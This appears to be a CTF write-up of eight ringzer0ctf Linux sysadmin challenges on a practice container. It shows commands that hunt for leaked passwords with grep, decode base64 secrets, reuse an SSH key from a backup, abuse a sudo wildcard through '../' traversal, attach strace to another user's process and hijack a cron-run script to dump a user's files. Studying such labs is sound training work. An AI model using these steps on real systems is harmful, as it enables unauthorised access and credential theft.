---
title: ringzer0ctf - SysAdmin Linux
description: My writeup on ringzer0ctf SysAdmin Linux challenges.
categories:
 - ringzer0ctf
tags: ringzer0ctf linux
---

![](https://i.imgur.com/oLJ9KlD.png)

You can find the challenges there > [ringzer0ctf](https://ringzer0ctf.com/challenges){:target="_blank"}

## Summary

Something different from vulnhub boxes, these challenges require command line skills! Great for beginners if they want to learn linux CLI. Let’s pwn them! :sunglasses:

## SysAdmin Part 1

![](https://i.imgur.com/VqYGrG6.png)

Let's connect to server as `morpheus:VNZDDLq2x9qXCzVdABbR1HOtz` and our goal is to find `Trinity` password!

We can see that trinity is a system user:

```
morpheus@lxc-sysadmin:~$ cat /etc/passwd | grep -i trinity
trinity:x:1001:1002::/home/trinity:/bin/bash
```

Let's use `grep` to search recursive:

```
morpheus@lxc-sysadmin:~$ grep -Ri "trinity" / 2>/dev/null
/etc/rc.local:/bin/sh /root/files/backup.sh -u trinity -p Flag-7e0cfcf090a2fe53c97ea3edd3883d0d &                                                                                                                             97ea3edd3883d0d &
```

We have the first flag! `Flag-7e0cfcf090a2fe53c97ea3edd3883d0d`

## SysAdmin Part 2

![](https://i.imgur.com/DmuTk1b.png)

We don't need to change user, our goal now is to find architect password.

Using the same `grep` technique we can detect a base64 password:

```
morpheus@lxc-sysadmin:~$ grep -R "architect" / 2>/dev/null
/etc/fstab:#//TheMAtrix/phone  /media/Matrix  cifs  username=architect,password=$(base64 -d "RkxBRy0yMzJmOTliNDE3OGJkYzdmZWY3ZWIxZjBmNzg4MzFmOQ=="),iocharset=utf8,sec=ntlm  0  0
```

Let's decode it:

```
morpheus@lxc-sysadmin:~$ echo RkxBRy0yMzJmOTliNDE3OGJkYzdmZWY3ZWIxZjBmNzg4MzFmOQ== | base64 -d
FLAG-232f99b4178bdc7fef7eb1f0f78831f9
```

We got the flag! `FLAG-232f99b4178bdc7fef7eb1f0f78831f9`

## SysAdmin Part 3

![](https://i.imgur.com/wu9VRvO.png)

Now we have to connect as `architect:FLAG-232f99b4178bdc7fef7eb1f0f78831f9` and search for the flag. We don't need to open a new SSH connection we can just use `su`:

```
morpheus@lxc-sysadmin:~$ su - architect
Password: FLAG-232f99b4178bdc7fef7eb1f0f78831f9
architect@lxc-sysadmin:~$
```

Let's search for files that owned by user architect:

```
architect@lxc-sysadmin:~$ find / -user "architect" 2>/dev/null
/var/www/index.php
```

```
architect@lxc-sysadmin:~$ cat /var/www/index.php

$info = (object)array();
$info->username = "arch";
$info->password = "asdftgTst5sdf6309sdsdff9lsdftz";
$id = 1003;
```

We can see some DB creds, let's use them with mysql & search for the flag:

```
architect@lxc-sysadmin:~$ mysql -u arch -p
Enter password:

mysql> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| arch               |
+--------------------+
2 rows in set (0.00 sec)

mysql> use arch;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
mysql> show tables;
+----------------+
| Tables_in_arch |
+----------------+
| arch           |
| flag           |
+----------------+
2 rows in set (0.00 sec)

mysql> select * from flag;
+---------------------------------------+
| flag                                  |
+---------------------------------------+
| FLAG-55548fdb24a6ef248d8fdfde2720f6bd |
+---------------------------------------+
1 row in set (0.00 sec)

mysql>
```

We got that flag! `FLAG-55548fdb24a6ef248d8fdfde2720f6bd`

## SysAdmin Part 4

![](https://i.imgur.com/VzGrXtu.png)

Now we have to go back as `morpheus` & get access to oracle account. If we use the `grep` command we can see in the end a "backup" file:

```
morpheus@lxc-sysadmin:~$ grep -Ri "oracle" / 2>/dev/null
..data..
Binary file /backup/c074fa6ec17bb35e168366c43cf4cd19 matches
```

There is a SSH private key in it, let's save it into a file and login as oracle:

```
morpheus@lxc-sysadmin:/tmp$ touch key
morpheus@lxc-sysadmin:/tmp$ nano key
morpheus@lxc-sysadmin:/tmp$ chmod 600 key
morpheus@lxc-sysadmin:/tmp$ ssh -i key oracle@127.0.0.1

oracle@lxc-sysadmin:~$
```

We got the flag! 

```
oracle@lxc-sysadmin:~$ base64 -d flag.txt
FLAG-d325e738fa7d87d4f5607c302b37db20
```

## SysAdmin Part 5

![](https://i.imgur.com/XHg2IGt.png)

We have to decrypt the oracle's encrypted file:

```
oracle@lxc-sysadmin:~$ ls -la
..data..
-r-x------ 1 oracle oracle   90 Oct  2  2018 encflag.txt.enc
```

I googled around "how to decrypt enc files" and all the answers are around `openssl` tool so i tried one of the commands i found but asks for a password:

```
oracle@lxc-sysadmin:~$ openssl enc -aes-256-cbc -d -in encflag.txt.enc -out file.txt
enter aes-256-cbc decryption password:
```

Hmm, so i had the idea to use `grep` to search for `openssl` commands:

```
oracle@lxc-sysadmin:~$ grep -ri "openssl" .
./.bashrc:alias reveal="openssl enc -aes-256-cbc -a -d -in encflag.txt.enc -k 'lp6PWgOwDctq5Yx7ntTmBpOISc'"
```

So we can use the `reveal` alias to get the flag!

```
oracle@lxc-sysadmin:~$ reveal
FLAG-54e7f8d0ea560fa7ed98e832900fc45b
```

## SysAdmin Part 6

![](https://i.imgur.com/kpmb3B4.png)

Now we have to login as `trinity:Flag-7e0cfcf090a2fe53c97ea3edd3883d0d` and search for neo password!

If we run `sudo -l` we can see that we can run as neo the `/bin/cat /home/trinity/*`:

```
trinity@lxc-sysadmin:~$ sudo -l
[sudo] password for trinity:
Matching Defaults entries for trinity on lxc-sysadmin:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User trinity may run the following commands on lxc-sysadmin:
    (neo) /bin/cat /home/trinity/*
```

We can see a copy of neo's phonebook:

```
trinity@lxc-sysadmin:~$ sudo -u neo /bin/cat /home/trinity/*
The Oracle        1800-133-7133
Persephone        345-555-1244





copy made by Cypher copy utility on /home/neo/phonebook
```

So we can do a trick here and use `..` to move to parent directory and read all phonebook:

```
trinity@lxc-sysadmin:~$ sudo -u neo /bin/cat /home/trinity/../neo/phonebook
The Oracle        1800-133-7133
Persephone        345-555-1244




change my current password FLAG-314df4d411ae37f16f590f65da99f3b6
```

We have the flag! `FLAG-314df4d411ae37f16f590f65da99f3b6`

## SysAdmin Part 7

![](https://i.imgur.com/yY8QQ3j.png)

Let's login as `neo:FLAG-314df4d411ae37f16f590f65da99f3b6` This is a bit tricky, if we run `ps` we can see that neo runs a binary `/bin/monitor`:

```
neo@lxc-sysadmin:~$ ps -f -u neo
UID        PID  PPID  C STIME TTY          TIME CMD
neo       4600  4598  0 Sep27 ?        00:00:00 /bin/monitor
neo      16808 16803  0 12:00 pts/5    00:00:00 -su
neo      20863 16808  0 13:18 pts/5    00:00:00 ps -f -u neo
```

I tried lot of stuff like `strings`,`ltrace` nothing but only `strace` works. If we use the path we will get perm error:

```
neo@lxc-sysadmin:~$ strace /bin/monitor
execve("/bin/monitor", ["/bin/monitor"], [/* 11 vars */]) = -1 EACCES (Permission denied)
write(2, "strace: exec: Permission denied\n", 32strace: exec: Permission denied
```

So we can use the PID:

```
neo@lxc-sysadmin:~$ strace -p 4600
strace: Process 4600 attached
restart_syscall(<... resuming interrupted nanosleep ...>) = 0
write(-1, "telnet 127.0.0.1 23\n", 20)  = -1 EBADF (Bad file descriptor)
write(-1, "user\n", 5)                  = -1 EBADF (Bad file descriptor)
write(-1, "FLAG-a4UVY5HJQO5ddLc5wtBps48A3\n", 31) = -1 EBADF (Bad file descriptor)
write(-1, "get-cpuinfo\n", 12)          = -1 EBADF (Bad file descriptor)
```

We got the flag! `FLAG-a4UVY5HJQO5ddLc5wtBps48A3`

## SysAdmin Part 8

![](https://i.imgur.com/018a7GX.png)

Let's do the last one now, we have to login as `morpheus:VNZDDLq2x9qXCzVdABbR1HOtz` & get access to the cypher account. I did the `grep` again and i found some interesting files under `/backup`:

```
morpheus@lxc-sysadmin:~$ grep -ri "cypher" / 2>/dev/null
..data..
Binary file /backup/3dab3277410dddca016834f91d172027 matches
Binary file /backup/ca584b15ae397a9ad45b1ff267b55796 matches
Binary file /backup/776d27d2a429e63bbc3cb29183417bb2 matches
```

All are tar archives:

```
morpheus@lxc-sysadmin:/backup$ file *
3dab3277410dddca016834f91d172027: POSIX tar archive (GNU)
776d27d2a429e63bbc3cb29183417bb2: POSIX tar archive (GNU)
c074fa6ec17bb35e168366c43cf4cd19: POSIX tar archive (GNU)
ca584b15ae397a9ad45b1ff267b55796: POSIX tar archive (GNU)
```

Let's copy them under /tmp & use bash script magic to untar them fast!

```
morpheus@lxc-sysadmin:/backup$ cp -R /backup /tmp
morpheus@lxc-sysadmin:/backup$ cd /tmp/backup
morpheus@lxc-sysadmin:/tmp/backup$ for files in *; do tar -xvf "$files"; done
var/log/syslog
tmp/
tmp/Gathering.py
home/
home/oracle/
home/oracle/.vimrc
home/oracle/.bash_history
home/oracle/.ssh/
home/oracle/.ssh/id_rsa
home/oracle/.ssh/id_rsa.pub
home/oracle/.ssh/authorized_keys
home/oracle/.bash_logout
home/oracle/.profile
home/oracle/.bashrc
var/spool/cron/
var/spool/cron/atspool/
var/spool/cron/crontabs/
var/spool/cron/crontabs/cypher
var/spool/cron/atjobs/
var/spool/cron/atjobs/.SEQ
```

We can see an interesting cronjob:

```
morpheus@lxc-sysadmin:/tmp/backup$ cat var/spool/cron/crontabs/cypher
..data..
# m h  dom mon dow   command
*/3 * * * * python /tmp/Gathering.py
```

This file runs every 3 minutes, let's edit it and make it to cat all files under cypher directory.

```
morpheus@lxc-sysadmin:/tmp/backup$ cat /tmp/Gathering.py
import os
os.system('cat /home/cypher/* > /tmp/pwned.txt')
morpheus@lxc-sysadmin:/tmp$ cat pwned.txt | tail -1 | base64 -d
FLAG-0cfc3390a082a22fdd763f4426f43296
```

The final flag! `FLAG-0cfc3390a082a22fdd763f4426f43296`

Awesome challenges! :smile:
